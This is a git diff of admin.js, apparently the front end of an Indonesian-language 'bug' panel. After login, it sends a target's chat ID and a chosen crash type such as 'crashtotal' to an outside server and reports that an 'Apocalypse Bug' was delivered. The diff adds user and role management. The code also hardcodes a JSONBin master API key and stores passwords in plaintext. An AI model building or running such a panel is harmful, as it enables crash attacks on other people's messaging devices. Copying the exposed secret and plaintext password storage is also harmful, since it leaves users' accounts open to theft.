@@ -1,23 +1,20 @@
+
 // admin.js
 
 const BIN_ID = "686d355c8561e97a5033af6a"; // Ganti dengan BIN ID kamu
 const API_KEY = "$2a$10$2rTDdHq.CHA3tkZbYEEJO.yx/8VtkA1H2cD5Yow/ktJDTVXfqK0R2"; // Ganti dengan API KEY kamu
 
-// Session Functions
 function saveSession(user) {
   sessionStorage.setItem("currentUser", JSON.stringify(user));
 }
-
 function getSession() {
   return JSON.parse(sessionStorage.getItem("currentUser"));
 }
-
 function logout() {
   sessionStorage.removeItem("currentUser");
   location.reload();
 }
 
-// Fetch User List from JSONBin
 async function getUsers() {
   try {
     const res = await fetch(`https://api.jsonbin.io/v3/qs/${BIN_ID}`, {
@@ -31,8 +28,24 @@ async function getUsers() {
     return [];
   }
 }
+async function saveUsers(users) {
+  try {
+    const res = await fetch(`https://api.jsonbin.io/v3/qs/${BIN_ID}`, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+      body: JSON.stringify(users),
+    });
+    if (!res.ok) throw new Error("Gagal menyimpan data!");
+    return true;
+  } catch (err) {
+    console.error("saveUsers error:", err);
+    return false;
+  }
+}
 
-// Login Process
 async function login() {
   const user = document.getElementById("username").value.trim();
   const pass = document.getElementById("password").value.trim();
@@ -50,20 +63,17 @@ async function login() {
   }
 }
 
-// Show Dashboard
 function showDashboard(user) {
   document.getElementById("login-box").style.display = "none";
   document.getElementById("main-box").style.display = "block";
   document.getElementById("userLabel").innerText = user.username;
 }
 
-// Auto Login if Session Exists
 window.onload = () => {
   const user = getSession();
   if (user) showDashboard(user);
 };
 
-// Bug Selection UI
 let selectedBug = "crashtotal";
 document.querySelectorAll(".bug-card").forEach(card => {
   card.addEventListener("click", () => {
@@ -73,17 +83,14 @@ document.querySelectorAll(".bug-card").forEach(card => {
   });
 });
 
-// Show / Close Popup
 function showPopup(message) {
   document.getElementById("popup-message").innerHTML = message;
   document.getElementById("popup").style.display = "flex";
 }
-
 function closePopup() {
   document.getElementById("popup").style.display = "none";
 }
 
-// Kirim Bug
 async function sendBug() {
   const input = document.getElementById("target").value.trim();
   const resDiv = document.getElementById("result");
@@ -103,7 +110,7 @@ async function sendBug() {
 
   try {
     const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-    const json = await res.json();
+    await res.json();
     showPopup(`Apocalypse Bug berhasil dikirim ke <b>${input}</b>`);
   } catch (err) {
     resDiv.innerText = "❌ Gagal mengirim: " + err;
@@ -112,4 +119,101 @@ async function sendBug() {
 
   btn.disabled = false;
   btn.innerHTML = originalHTML;
+}
+
+async function addUser() {
+  const username = document.getElementById("newUser").value.trim();
+  const password = document.getElementById("newPass").value.trim();
+  const role = document.getElementById("newRole").value;
+  const result = document.getElementById("manage-result");
+
+  if (!username || !password) {
+    result.innerText = "❌ Username dan Password wajib diisi!";
+    return;
+  }
+
+  const users = await getUsers();
+  if (users.find(u => u.username === username)) {
+    result.innerText = "❌ Username sudah terdaftar!";
+    return;
+  }
+
+  users.push({ username, password, role });
+  const success = await saveUsers(users);
+  result.innerText = success ? "✅ User berhasil ditambahkan!" : "❌ Gagal menyimpan user!";
+}
+
+async function changeRole() {
+  const username = document.getElementById("targetUsername").value.trim();
+  const newRole = document.getElementById("newRoleChange").value;
+  const result = document.getElementById("manage-result");
+
+  const users = await getUsers();
+  const user = users.find(u => u.username === username);
+  if (!user) {
+    result.innerText = "❌ User tidak ditemukan!";
+    return;
+  }
+
+  user.role = newRole;
+  const success = await saveUsers(users);
+  result.innerText = success ? "✅ Role berhasil diubah!" : "❌ Gagal mengubah role!";
+}
+
+async function changePassword() {
+  const oldPass = document.getElementById("oldPass").value.trim();
+  const newPass1 = document.getElementById("newPass1").value.trim();
+  const newPass2 = document.getElementById("newPass2").value.trim();
+  const result = document.getElementById("password-result");
+
+  const session = getSession();
+  if (!session) {
+    result.innerText = "❌ Anda tidak login.";
+    return;
+  }
+  if (newPass1 !== newPass2) {
+    result.innerText = "❌ Password baru tidak cocok!";
+    return;
+  }
+  if (session.password !== oldPass) {
+    result.innerText = "❌ Password lama salah!";
+    return;
+  }
+
+  const users = await getUsers();
+  const user = users.find(u => u.username === session.username);
+  if (!user) {
+    result.innerText = "❌ User tidak ditemukan!";
+    return;
+  }
+
+  user.password = newPass1;
+  const success = await saveUsers(users);
+  if (success) {
+    result.innerText = "✅ Password berhasil diubah!";
+    saveSession(user);
+  } else {
+    result.innerText = "❌ Gagal menyimpan perubahan!";
+  }
+}
+
+async function addSimpleUser() {
+  const username = document.getElementById("simpleUsername").value.trim();
+  const password = document.getElementById("simplePassword").value.trim();
+  const result = document.getElementById("simple-result");
+
+  if (!username || !password) {
+    result.innerText = "❌ Username dan Password wajib diisi!";
+    return;
+  }
+
+  const users = await getUsers();
+  if (users.find(u => u.username === username)) {
+    result.innerText = "❌ Username sudah terdaftar!";
+    return;
+  }
+
+  users.push({ username, password, role: "user" });
+  const success = await saveUsers(users);
+  result.innerText = success ? "✅ User berhasil ditambahkan!" : "❌ Gagal menyimpan user!";
 }
